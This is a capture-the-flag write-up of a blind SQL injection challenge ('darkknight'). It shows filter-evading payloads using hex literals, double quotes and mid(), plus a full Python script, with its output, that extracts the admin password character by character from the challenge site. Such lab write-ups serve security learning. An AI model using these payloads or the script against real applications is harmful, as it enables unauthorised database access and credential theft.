---
custom_edit_url: null
sidebar_position: 12
---

<figure style={{ textAlign: 'center' }}>
![1](https://github.com/Kunull/Write-ups/assets/110326359/6cde625d-39f4-4536-bdd2-e4bacc1b7d44)
</figure>

We are provided with the SQL query:

```sql
SELECT id FROM prob_darkknight WHERE id='guest' AND pw='{$_GET[pw]}' AND no={$_GET[no]}
```

The code performs two conditional checks:

1. `if($result['id'])`: It checks if the statement is `True`. If yes, it prints the message `Hello {$result[id]}`
2. `if(($result['pw']) && ($result['pw'] == $_GET['pw']))`: It then checks if the `pw` that is provided is correct. If yes, it prints the flag.


In order to print out the flag, we need to first know the password. We have to perform a Blind SQL Injection.

This challenge also filters out the quotes character. 

We have to use Hexadecimal representations instead of strings. Alternatively, we can use the double-quote (`"`) character to bypass the filter.

## Blind SQL Injection

### Retrieving the password length

If we provide the following URI parameter:

```
?no=0 OR id LIKE 0x61646d696e AND length(pw) LIKE 1
```

The resultant query becomes:

```sql
SELECT id FROM prob_darkknight WHERE id='guest' AND pw='' AND no=0 OR id LIKE 0x61646d696e AND length(pw) LIKE 1
```

<figure style={{ textAlign: 'center' }}>
![2](https://github.com/Kunull/Write-ups/assets/110326359/70be2f68-c530-4dcc-a541-a9b8938765df)
</figure>

Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.

That tells us that the length of the `pw` column is more than 1.

If we keep increasing the length and provide the following URI parameter:

```
?no=0 OR id LIKE 0x61646d696e AND length(pw) LIKE 8
```

The resultant query becomes:

```sql
SELECT id FROM prob_darkknight WHERE id='guest' AND pw='' AND no=0 OR id LIKE 0x61646d696e AND length(pw) LIKE 8
```

<figure style={{ textAlign: 'center' }}>
![4](https://github.com/Kunull/Write-ups/assets/110326359/a1ed7953-f711-4a32-9573-2eeb70fb0e4b)
</figure>

Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.

That tells us that the length of the `pw` column is 8.

### Leaking the password

This challenge also filters the `substring()` function.

Therefore, in order to leak the password, we will have to use the `mid()` function.
#### `mid()`

<figure style={{ textAlign: 'center' }}>
![3](https://github.com/Kunull/Write-ups/assets/110326359/2a05edee-9e1c-43b3-8970-4ea391376a28)
</figure>

If we provide the following URI parameter:

```
?no=0 OR id LIKE 0x61646d696e AND mid(pw, 1, 1) LIKE 0x30
```

The resultant query becomes:

```sql
SELECT id FROM prob_darkknight WHERE id='guest' AND pw='' AND no=0 OR id LIKE 0x61646d696e AND mid(pw, 1, 1) LIKE 0x30
```

<figure style={{ textAlign: 'center' }}>
![5](https://github.com/Kunull/Write-ups/assets/110326359/89f8306f-902d-4bdc-bd15-4357ce6586b3)
</figure>

Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.

That tells us that the first character of the `pw` for `id=admin` is `0x30` which is `0`.

We can move onto the second character:

```
?no=0 OR id LIKE 0x61646d696e AND mid(pw, 2, 1) LIKE 0x30
```

The resultant query becomes:

```sql
SELECT id FROM prob_darkknight WHERE id='guest' AND pw='' AND no=0 OR id LIKE 0x61646d696e AND mid(pw, 2, 1) LIKE 0x30
```

<figure style={{ textAlign: 'center' }}>
![6](https://github.com/Kunull/Write-ups/assets/110326359/227d4a99-7fca-41ba-a579-55a57325abea)
</figure>

Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.

That tells us that the first character of the `pw` for `id=admin` is not `0x30` which is `0`.

We can keep repeating this process until we get all the eight characters of the admin password:

```
0b70ea1f
```

### Script

We can automate the entire process using a script.

```python title="darkknight_script.py"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': 'd6k46orbbik0hppkki48hqdg9k'}
url = 'https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php'
password_length = 0

for x in range(0, 10):
  payload = f'0 OR id LIKE "admin" AND length(pw) LIKE {x}'
  encoded_payload = urllib.parse.quote_plus(payload)
  full_url = f"{url}?no={encoded_payload}"
    
  response = requests.get(full_url, cookies=cookies)
    
  if "Hello admin" in response.text:
    password_length = x
    break

print()    
print(f'[!] Payload: ?no={payload}')
print(f'[!] Payload (URL encoded): ?no={encoded_payload}')
print(f'[!] Password length: {password_length}')

password = ''
searchspace = string.digits + string.ascii_letters

for index in range(1, password_length + 1):
  for char in searchspace:
    payload = f'0 OR id LIKE "admin" AND mid(pw, {index}, 1) LIKE "{char}"'
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f'{url}?no={encoded_payload}'

    response = requests.get(full_url, cookies=cookies)

    if 'Hello admin' in response.text:
      password += char
      print()
      print(f'[+] Payload: ?no={payload}')
      print(f'[+] Payload (URL encoded): ?no={encoded_payload}')
      print(f'[+] Character at index {index}: {char}')
      break

print()
print(f'[!] Extracted password: {password}')
print(f'[!] Final payload: ?pw={password}')
```

```
python .\darkknight_script.py

[!] Payload: ?no=0 OR id LIKE "admin" AND length(pw) LIKE 8
[!] Payload (URL encoded): ?no=0+OR+id+LIKE+%22admin%22+AND+length%28pw%29+LIKE+8
[!] Password length: 8

[+] Payload: ?no=0 OR id LIKE "admin" AND mid(pw, 1, 1) LIKE "0"
[+] Payload (URL encoded): ?no=0+OR+id+LIKE+%22admin%22+AND+mid%28pw%2C+1%2C+1%29+LIKE+%220%22
[+] Character at index 1: 0

[+] Payload: ?no=0 OR id LIKE "admin" AND mid(pw, 2, 1) LIKE "b"
[+] Payload (URL encoded): ?no=0+OR+id+LIKE+%22admin%22+AND+mid%28pw%2C+2%2C+1%29+LIKE+%22b%22
[+] Character at index 2: b

[+] Payload: ?no=0 OR id LIKE "admin" AND mid(pw, 3, 1) LIKE "7"
[+] Payload (URL encoded): ?no=0+OR+id+LIKE+%22admin%22+AND+mid%28pw%2C+3%2C+1%29+LIKE+%227%22
[+] Character at index 3: 7

[+] Payload: ?no=0 OR id LIKE "admin" AND mid(pw, 4, 1) LIKE "0"
[+] Payload (URL encoded): ?no=0+OR+id+LIKE+%22admin%22+AND+mid%28pw%2C+4%2C+1%29+LIKE+%220%22
[+] Character at index 4: 0

[+] Payload: ?no=0 OR id LIKE "admin" AND mid(pw, 5, 1) LIKE "e"
[+] Payload (URL encoded): ?no=0+OR+id+LIKE+%22admin%22+AND+mid%28pw%2C+5%2C+1%29+LIKE+%22e%22
[+] Character at index 5: e

[+] Payload: ?no=0 OR id LIKE "admin" AND mid(pw, 6, 1) LIKE "a"
[+] Payload (URL encoded): ?no=0+OR+id+LIKE+%22admin%22+AND+mid%28pw%2C+6%2C+1%29+LIKE+%22a%22
[+] Character at index 6: a

[+] Payload: ?no=0 OR id LIKE "admin" AND mid(pw, 7, 1) LIKE "1"
[+] Payload (URL encoded): ?no=0+OR+id+LIKE+%22admin%22+AND+mid%28pw%2C+7%2C+1%29+LIKE+%221%22
[+] Character at index 7: 1

[+] Payload: ?no=0 OR id LIKE "admin" AND mid(pw, 8, 1) LIKE "f"
[+] Payload (URL encoded): ?no=0+OR+id+LIKE+%22admin%22+AND+mid%28pw%2C+8%2C+1%29+LIKE+%22f%22
[+] Character at index 8: f

[!] Extracted password: 0b70ea1f
[!] Final payload: ?pw=0b70ea1f
```

Now, we can provide password URI parameter:

```
?pw=0b70ea1f
```

The resultant query becomes:

```sql
SELECT id FROM prob_darkknight WHERE id='guest' AND pw='0b70ea1f' AND no=
```

<figure style={{ textAlign: 'center' }}>
![7](https://github.com/Kunull/Write-ups/assets/110326359/57213d19-deff-48b5-9681-d2cc8de28edf)
</figure>
